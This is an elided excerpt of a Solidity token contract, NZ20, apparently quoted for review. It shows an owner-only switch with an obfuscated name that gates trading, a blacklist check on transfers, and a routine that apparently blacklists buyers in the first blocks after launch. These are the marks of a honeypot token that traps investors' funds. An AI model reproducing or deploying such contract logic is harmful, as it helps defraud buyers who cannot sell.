...
contract NZ20 is Context, IERC20, Ownable {
    ...
    function letsEatCake(uint256 canteat,bool status) public onlyOwner {
        cantEatCake = canteat;
        nowIsEatingCake = status;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(isBlackList[sender] == false && isBlackList[recipient] == false, "You are black");
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                ...
                require(nowIsEatingCake);
                if (smallOrEqual(block.number , whenEat + cantEatCake) && !isMarketPair[recipient]) {youCantEat(recipient);}
